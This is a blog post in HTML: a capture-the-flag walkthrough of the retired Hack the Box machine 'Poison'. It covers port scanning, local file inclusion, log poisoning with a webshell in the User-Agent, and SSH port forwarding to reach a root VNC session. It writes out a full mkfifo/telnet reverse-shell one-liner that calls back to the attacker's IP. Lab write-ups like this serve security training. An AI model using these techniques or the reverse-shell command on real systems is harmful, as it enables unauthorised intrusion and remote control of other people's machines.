@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Poison - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Poison" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/poison-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-09-08T20:26:22+01:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/poison.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Medium" property="article:tag">
+    
+    <meta content="FreeBSD" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CTF" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Poison">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/poison-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/poison.png">
+  
+
+	<meta name="description" content="Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/poison.png alt="Hack the Box - Poison">
+        
+          <figcaption>Poison</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Poison</h1>
+        <div class="page-date"><span>2020, Sep 08&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
+└─$ sudo nmap -p- -T4 10.129.117.245   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:34 GMT
+Stats: 0:05:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 78.95% done; ETC: 20:41 (0:01:22 remaining)
+Nmap scan report for 10.129.117.245
+Host is up (0.016s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 388.67 seconds
+</code></pre></div></div>
+<p>When interacting with the site I noticed that when you choose a script it includes it as a query parameter which hints at LFI. To test this I tried to include <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and was happy to see it was successful.</p>
+
+<h2 id="foothold">Foothold</h2>
+<p>As there didn’t seem to be a way to upload files, adding an entry into the log files seemed like a logical approach. I tested including the log files and managed to using the filepath <code class="language-plaintext highlighter-rouge">/var/log/httpd-access.log</code>. Then using burpsuite I added a webshell through the user agent. With this in place I was able to achieve RCE and sent back a reverse shell using the following command.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.27 8082 &gt; /tmp/f
+</code></pre></div></div>
+<p>With a netcat listener running it sent back the shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
+└─$ nc -nlvp 8082
+listening on [any] 8082 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.117.252] 37331
+whoami
+www
+</code></pre></div></div>
+<p>In this directory I found a password backup file that had been repeatedly base64 encoded. So after a few iterations of decoding it, which we can use to SSH in as a user.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>During enumeration on the target I found a file called <code class="language-plaintext highlighter-rouge">secret.zip</code>. This can be extracted using the users password. I also found a port open that was bound to localhost. So we can set up port forwarding using SSH with the following command.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
+└─$ ssh -L 5901:127.0.0.1:5901 charix@10.129.117.252
+Password for charix@Poison:
+Last login: Mon Mar 22 23:14:57 2021 from 10.10.14.27
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+
+Welcome to FreeBSD!
+</code></pre></div></div>
+<p>Googling the port I found it was a vnc port so while attempting to use the extracted secret file and connect on that port we then get a root shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
+└─$ vncviewer 127.0.0.1::5901 -passwd secret/secret
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Authentication successful
+Desktop name "root's X desktop (Poison:1)"
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Poison&url=http://localhost:4000/poison-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/poison-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/poison-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Medium" class="tag">&#35; Medium</a>
+          
+            <a href="/tags#FreeBSD" class="tag">&#35; FreeBSD</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CTF" class="tag">&#35; CTF</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
